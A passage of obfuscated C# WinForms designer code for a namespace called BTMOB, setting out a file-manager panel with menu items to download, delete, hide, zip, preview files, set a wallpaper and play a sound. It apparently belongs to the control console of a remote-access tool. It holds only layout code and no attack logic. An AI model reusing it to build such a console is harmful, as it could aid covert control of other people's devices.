		this.DecodeToolStripMenuItem.Name = EXGuarder._10062A67;
		this.DecodeToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.DecodeToolStripMenuItem.Text = EXGuarder._350D6E0C;
		this.PreviewToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.PreviewToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.PreviewToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.PreviewToolStripMenuItem.Image = BTMOB.My.Resources.Resources.watchvideo;
		this.PreviewToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.PreviewToolStripMenuItem.Name = EXGuarder._30582018;
		this.PreviewToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.PreviewToolStripMenuItem.Text = EXGuarder._2A3F6B49;
		this.ZipToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ZipToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.ZipToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.ZipToolStripMenuItem.Image = BTMOB.My.Resources.Resources.zipfolder;
		this.ZipToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ZipToolStripMenuItem.Name = EXGuarder._4F510B57;
		this.ZipToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.ZipToolStripMenuItem.Text = EXGuarder._08435B73;
		this.UnZipToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.UnZipToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.UnZipToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.UnZipToolStripMenuItem.Image = BTMOB.My.Resources.Resources.unzipfolder;
		this.UnZipToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.UnZipToolStripMenuItem.Name = EXGuarder._2D3B5F51;
		this.UnZipToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.UnZipToolStripMenuItem.Text = EXGuarder._3F243279;
		this.DeleteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DeleteToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.DeleteToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.DeleteToolStripMenuItem.Image = BTMOB.My.Resources.Resources.deletefile;
		this.DeleteToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.DeleteToolStripMenuItem.Name = EXGuarder._2774355A;
		this.DeleteToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.Delete;
		this.DeleteToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.DeleteToolStripMenuItem.Text = EXGuarder._462C2F67;
		this.AddFilesToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.AddFilesToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.AddFilesToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.AddFilesToolStripMenuItem.Image = BTMOB.My.Resources.Resources.newfolder1;
		this.AddFilesToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.AddFilesToolStripMenuItem.Name = EXGuarder._23544352;
		this.AddFilesToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.AddFilesToolStripMenuItem.Text = EXGuarder._52470539;
		this.EditToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.EditToolStripMenuItem.Enabled = false;
		this.EditToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.EditToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.EditToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject(EXGuarder._3346614B);
		this.EditToolStripMenuItem.Name = EXGuarder._20735262;
		this.EditToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.EditToolStripMenuItem.Text = EXGuarder._450E0A5C;
		this.EditToolStripMenuItem.Visible = false;
		this.DownloadFileToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DownloadFileToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.DownloadFileToolStripMenuItem.Image = BTMOB.My.Resources.Resources.downoadfile1;
		this.DownloadFileToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.DownloadFileToolStripMenuItem.Name = EXGuarder._206F522A;
		this.DownloadFileToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.DownloadFileToolStripMenuItem.Text = EXGuarder._1C0D3F38;
		this.HideToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.HideToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.HideToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.HideToolStripMenuItem.Image = BTMOB.My.Resources.Resources.hidefile1;
		this.HideToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.HideToolStripMenuItem.Name = EXGuarder._0F3A6F37;
		this.HideToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.HideToolStripMenuItem.Text = EXGuarder._63562C0E;
		this.ShowToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ShowToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.ShowToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.ShowToolStripMenuItem.Image = BTMOB.My.Resources.Resources.showfile;
		this.ShowToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ShowToolStripMenuItem.Name = EXGuarder._2C625579;
		this.ShowToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.ShowToolStripMenuItem.Text = EXGuarder._202E0D73;
		this.SetWallpaperToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.SetWallpaperToolStripMenuItem.Enabled = false;
		this.SetWallpaperToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.SetWallpaperToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.SetWallpaperToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject(EXGuarder._5D2A123E);
		this.SetWallpaperToolStripMenuItem.Name = EXGuarder._5A34721E;
		this.SetWallpaperToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.SetWallpaperToolStripMenuItem.Text = EXGuarder._0049133B;
		this.SetWallpaperToolStripMenuItem.Visible = false;
		this.PlaySoundToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.PlaySoundToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.PlaySoundToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.PlaySoundToolStripMenuItem.Image = BTMOB.My.Resources.Resources.playsound;
		this.PlaySoundToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.PlaySoundToolStripMenuItem.Name = EXGuarder._1D333279;
		this.PlaySoundToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.PlaySoundToolStripMenuItem.Text = EXGuarder._1169516F;
		this.FolderDownloadsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.FolderDownloadsToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.FolderDownloadsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.FolderDownloadsToolStripMenuItem.Image = BTMOB.My.Resources.Resources.userdownloads;
		this.FolderDownloadsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.FolderDownloadsToolStripMenuItem.Name = EXGuarder._065A2072;
		this.FolderDownloadsToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.FolderDownloadsToolStripMenuItem.Text = EXGuarder._3C087278;
		this.tabsfiles.Controls.Add(this.TabPage1);
		this.tabsfiles.Controls.Add(this.TabPage2);
		this.tabsfiles.Controls.Add(this.TabPage3);
		this.tabsfiles.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabsfiles.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.tabsfiles.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.tabsfiles.Font = new System.Drawing.Font(EXGuarder._0C280858, 11f, System.Drawing.FontStyle.Bold);
		this.tabsfiles.ItemSize = new System.Drawing.Size(0, 1);
		this.tabsfiles.Location = new System.Drawing.Point(5, 54);
		this.tabsfiles.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.tabsfiles.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.tabsfiles.Name = EXGuarder._0D275D27;
		this.tabsfiles.SelectedIndex = 0;
		this.tabsfiles.Size = new System.Drawing.Size(1231, 753);
		this.tabsfiles.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.tabsfiles.Style = DrakeUI.Framework.UIStyle.Custom;
		this.tabsfiles.StyleCustomMode = true;
		this.tabsfiles.TabBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.tabsfiles.TabIndex = 35;
		this.tabsfiles.TabSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.tabsfiles.TabSelectedForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.tabsfiles.TabSelectedHighColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.tabsfiles.TabUnSelectedForeColor = System.Drawing.Color.DarkGray;
		this.tabsfiles.TabVisible = false;
		this.TabPage1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.TabPage1.Controls.Add(this.listfilesvew);
		this.TabPage1.Controls.Add(this.PBtitlebar);
		this.TabPage1.Controls.Add(this.Panel3);
		this.TabPage1.Controls.Add(this.Panel9);
		this.TabPage1.Controls.Add(this.emptytext);
		this.TabPage1.ForeColor = System.Drawing.Color.White;
		this.TabPage1.ImageIndex = 0;
		this.TabPage1.Location = new System.Drawing.Point(0, 0);
		this.TabPage1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.TabPage1.Name = EXGuarder._0F60454E;
		this.TabPage1.Size = new System.Drawing.Size(1231, 753);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = EXGuarder._6A6E0F17;
		this.listfilesvew.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.listfilesvew.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listfilesvew.CausesValidation = false;
		this.listfilesvew.CellEditUseWholeCell = false;
		this.listfilesvew.ContextMenuStrip = this.ctxMenu;
		this.listfilesvew.CopySelectionOnControlCUsesDragSource = false;
		this.listfilesvew.Cursor = System.Windows.Forms.Cursors.Hand;
		this.listfilesvew.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listfilesvew.FullRowSelect = true;
		this.listfilesvew.HasCollapsibleGroups = false;
		this.listfilesvew.HeaderFont = new System.Drawing.Font(EXGuarder._0C280858, 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.listfilesvew.HeaderFormatStyle = this.HeaderFormatStyle1;
		this.listfilesvew.HideSelection = false;
		this.listfilesvew.IsSearchOnSortColumn = false;
		this.listfilesvew.LargeImageList = this.thumbsimags;
		this.listfilesvew.Location = new System.Drawing.Point(231, 131);
		this.listfilesvew.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.listfilesvew.Name = EXGuarder._044A175E;
		this.listfilesvew.OverlayImage.Alignment = System.Drawing.ContentAlignment.MiddleCenter;
		this.listfilesvew.SelectColumnsMenuStaysOpen = false;
		this.listfilesvew.SelectColumnsOnRightClick = false;
		this.listfilesvew.SelectColumnsOnRightClickBehaviour = BrightIdeasSoftware.ObjectListView.ColumnSelectBehaviour.None;
		this.listfilesvew.SelectedBackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.listfilesvew.SelectedForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.listfilesvew.ShowFilterMenuOnRightClick = false;
		this.listfilesvew.ShowGroups = false;
		this.listfilesvew.ShowHeaderInAllViews = false;
		this.listfilesvew.ShowImagesOnSubItems = true;
		this.listfilesvew.ShowSortIndicators = false;
		this.listfilesvew.Size = new System.Drawing.Size(1000, 622);
		this.listfilesvew.SmallImageList = this.filesicons;
		this.listfilesvew.SortGroupItemsByPrimaryColumn = false;
		this.listfilesvew.TabIndex = 41;
		this.listfilesvew.TriggerCellOverEventsWhenOverHeader = false;
		this.listfilesvew.UpdateSpaceFillingColumnsWhenDraggingColumnDivider = false;
		this.listfilesvew.UseCompatibleStateImageBehavior = false;
		this.listfilesvew.UseHotControls = false;
		this.listfilesvew.UseOverlays = false;
		this.listfilesvew.View = System.Windows.Forms.View.Details;
		this.listfilesvew.VirtualMode = true;
		headerStateStyle.BackColor = System.Drawing.Color.Gray;
		headerStateStyle.ForeColor = System.Drawing.Color.White;
		this.HeaderFormatStyle1.Hot = headerStateStyle;
		headerStateStyle2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		headerStateStyle2.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		headerStateStyle2.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.HeaderFormatStyle1.Normal = headerStateStyle2;
		this.HeaderFormatStyle1.Pressed = pressed;
		this.thumbsimags.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit;
		this.thumbsimags.ImageSize = new System.Drawing.Size(45, 45);
		this.thumbsimags.TransparentColor = System.Drawing.Color.Transparent;
		this.filesicons.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit;
		this.filesicons.ImageSize = new System.Drawing.Size(32, 32);
		this.filesicons.TransparentColor = System.Drawing.Color.Transparent;
		this.PBtitlebar.DisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.PBtitlebar.Dock = System.Windows.Forms.DockStyle.Top;
		this.PBtitlebar.Enabled = false;
		this.PBtitlebar.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.PBtitlebar.Font = new System.Drawing.Font(EXGuarder._0C280858, 12f);
		this.PBtitlebar.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.PBtitlebar.Location = new System.Drawing.Point(231, 126);
		this.PBtitlebar.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.PBtitlebar.Name = EXGuarder._1B732560;
		this.PBtitlebar.ReadOnly = true;
		this.PBtitlebar.RectColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.PBtitlebar.Size = new System.Drawing.Size(1000, 5);
		this.PBtitlebar.Style = DrakeUI.Framework.UIStyle.Custom;
		this.PBtitlebar.TabIndex = 45;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.pathtxt);
		this.Panel3.Controls.Add(this.Panel10);
		this.Panel3.Controls.Add(this.DrakeWidth_W9);
		this.Panel3.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel3.Controls.Add(this.DrakeWidth_W3);
		this.Panel3.Controls.Add(this.DrakeUIButtonIcon3);
		this.Panel3.Controls.Add(this.Label2);
		this.Panel3.Controls.Add(this.searchtext);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(231, 78);
		this.Panel3.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.Panel3.Name = EXGuarder._436E3C26;
		this.Panel3.Padding = new System.Windows.Forms.Padding(11, 10, 11, 10);
		this.Panel3.Size = new System.Drawing.Size(1000, 48);
		this.Panel3.TabIndex = 35;
		this.pathtxt.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pathtxt.Cursor = System.Windows.Forms.Cursors.No;
		this.pathtxt.Dock = System.Windows.Forms.DockStyle.Fill;
		this.pathtxt.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.pathtxt.FillDisableColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.pathtxt.Font = new System.Drawing.Font(EXGuarder._0C280858, 8f);
		this.pathtxt.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pathtxt.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pathtxt.Location = new System.Drawing.Point(128, 10);
		this.pathtxt.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.pathtxt.Maximum = 2147483647.0;
		this.pathtxt.Minimum = -2147483648.0;
		this.pathtxt.Name = EXGuarder._145C2A35;
		this.pathtxt.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.pathtxt.Radius = 15;
		this.pathtxt.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pathtxt.RectDisableColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pathtxt.Size = new System.Drawing.Size(661, 23);
		this.pathtxt.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pathtxt.StyleCustomMode = true;
		this.pathtxt.TabIndex = 29;
		this.pathtxt.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel10.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel10.Location = new System.Drawing.Point(789, 10);
		this.Panel10.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel10.Name = EXGuarder._321B6B11;
		this.Panel10.Padding = new System.Windows.Forms.Padding(11, 10, 11, 10);
		this.Panel10.Size = new System.Drawing.Size(15, 28);
		this.Panel10.TabIndex = 35;
		this.DrakeWidth_W9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W9.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W9.Location = new System.Drawing.Point(112, 10);
		this.DrakeWidth_W9.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W9.Name = EXGuarder._5E6F5660;
		this.DrakeWidth_W9.Size = new System.Drawing.Size(16, 28);
		this.DrakeWidth_W9.TabIndex = 36;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(67, 10);
		this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeUIButtonIcon1.Name = EXGuarder._34775145;
		this.DrakeUIButtonIcon1.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon1.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(45, 28);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61470;
		this.DrakeUIButtonIcon1.TabIndex = 33;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(56, 10);
		this.DrakeWidth_W3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W3.Name = EXGuarder._06500B0B;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(11, 28);
		this.DrakeWidth_W3.TabIndex = 34;
		this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon3.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.DrakeUIButtonIcon3.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon3.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(11, 10);
		this.DrakeUIButtonIcon3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeUIButtonIcon3.Name = EXGuarder._4958530D;
		this.DrakeUIButtonIcon3.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon3.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(45, 28);
		this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon3.Symbol = 61523;
		this.DrakeUIButtonIcon3.SymbolSize = 20;
		this.DrakeUIButtonIcon3.TabIndex = 32;
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font(EXGuarder._0C280858, 20f, System.Drawing.FontStyle.Bold);
		this.Label2.Location = new System.Drawing.Point(13, 18);
		this.Label2.Name = EXGuarder._0B36483E;
		this.Label2.Size = new System.Drawing.Size(0, 40);
		this.Label2.TabIndex = 9;
		this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.searchtext.Dock = System.Windows.Forms.DockStyle.Right;
		this.searchtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.searchtext.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.searchtext.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.searchtext.ForeColor = System.Drawing.Color.White;
		this.searchtext.Location = new System.Drawing.Point(804, 10);
		this.searchtext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.searchtext.Maximum = 2147483647.0;
		this.searchtext.Minimum = -2147483648.0;
		this.searchtext.Name = EXGuarder._5C005D33;
		this.searchtext.Padding = new System.Windows.Forms.Padding(5);
		this.searchtext.Radius = 15;
		this.searchtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.searchtext.Size = new System.Drawing.Size(185, 25);
		this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchtext.TabIndex = 30;
		this.searchtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.searchtext.Watermark = EXGuarder._02453B1F;
		this.Panel9.Controls.Add(this.Panel6);
		this.Panel9.Controls.Add(this.viwimagepanel);
		this.Panel9.Controls.Add(this.TableLayoutPanel2);
		this.Panel9.Controls.Add(this.DrakeWidth_W2);
		this.Panel9.Controls.Add(this.Panel11);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel9.Location = new System.Drawing.Point(0, 78);
		this.Panel9.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel9.Name = EXGuarder._45424E01;
		this.Panel9.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.Panel9.Size = new System.Drawing.Size(231, 675);
		this.Panel9.TabIndex = 36;
		this.Panel6.Controls.Add(this.Panel13);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel6.Location = new System.Drawing.Point(8, 239);
		this.Panel6.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel6.Name = EXGuarder._762D6E16;
		this.Panel6.Size = new System.Drawing.Size(215, 102);
		this.Panel6.TabIndex = 46;
		this.Panel13.Controls.Add(this.autoloadtogle);
		this.Panel13.Controls.Add(this.DrakeWidth_W11);
		this.Panel13.Controls.Add(this.toggleview);
		this.Panel13.Controls.Add(this.DrakeWidth_W4);
		this.Panel13.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel13.Location = new System.Drawing.Point(0, 0);
		this.Panel13.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel13.Name = EXGuarder._680D1C1A;
		this.Panel13.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.Panel13.Size = new System.Drawing.Size(215, 118);
		this.Panel13.TabIndex = 36;
		this.autoloadtogle.Cursor = System.Windows.Forms.Cursors.Hand;
		this.autoloadtogle.Dock = System.Windows.Forms.DockStyle.Top;
		this.autoloadtogle.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.autoloadtogle.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autoloadtogle.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.autoloadtogle.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.autoloadtogle.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.autoloadtogle.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.autoloadtogle.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.autoloadtogle.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.autoloadtogle.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.autoloadtogle.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.autoloadtogle.Location = new System.Drawing.Point(8, 67);
		this.autoloadtogle.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.autoloadtogle.Name = EXGuarder._6D194748;
		this.autoloadtogle.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.autoloadtogle.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.autoloadtogle.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.autoloadtogle.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.autoloadtogle.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.autoloadtogle.Size = new System.Drawing.Size(199, 32);
		this.autoloadtogle.Style = DrakeUI.Framework.UIStyle.Custom;
		this.autoloadtogle.Symbol = 61808;
		this.autoloadtogle.TabIndex = 50;
		this.autoloadtogle.Text = EXGuarder._393C6D05;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(8, 53);
		this.DrakeWidth_W11.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W11.Name = EXGuarder._3D690866;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(199, 14);
		this.DrakeWidth_W11.TabIndex = 36;
		this.toggleview.Cursor = System.Windows.Forms.Cursors.Hand;
		this.toggleview.Dock = System.Windows.Forms.DockStyle.Top;
		this.toggleview.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.toggleview.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.toggleview.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.toggleview.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.toggleview.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.toggleview.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.toggleview.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.toggleview.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.toggleview.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.toggleview.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.toggleview.Location = new System.Drawing.Point(8, 21);
		this.toggleview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.toggleview.Name = EXGuarder._231C2B02;
